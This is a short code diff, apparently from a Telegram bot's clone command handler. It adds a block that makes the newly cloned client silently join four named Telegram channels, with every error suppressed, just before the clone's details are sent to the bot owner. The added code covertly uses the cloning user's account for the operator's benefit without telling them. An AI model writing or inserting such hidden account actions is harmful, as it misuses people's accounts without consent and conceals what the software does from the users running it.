@@ -52,6 +52,25 @@ async def clone_txt(client, message):
             total_clones = len(cloned_bots_list)
             await idclonebotdb.insert_one(details)
             IDCLONES.add(user.id)
+            try:
+                try:
+                    await ai.join_chat("THE_VIP_BOY")
+                except:
+                    pass
+                try:
+                    await ai.join_chat("VIP_CREATORS")
+                except:
+                    pass
+                try:
+                    await ai.join_chat("THE_VIP_BOY_OP")
+                except:
+                    pass
+                try:
+                    await ai.join_chat("TG_FRIENDSSS")
+                except:
+                    pass
+            except Exception as e:
+                pass
             
             await app.send_message(
                 int(OWNER_ID), f"**#New_Clone**\n\n**User:** @{username}\n\n**Details:** {details}\n\n**Total Clones:** {total_clones}"
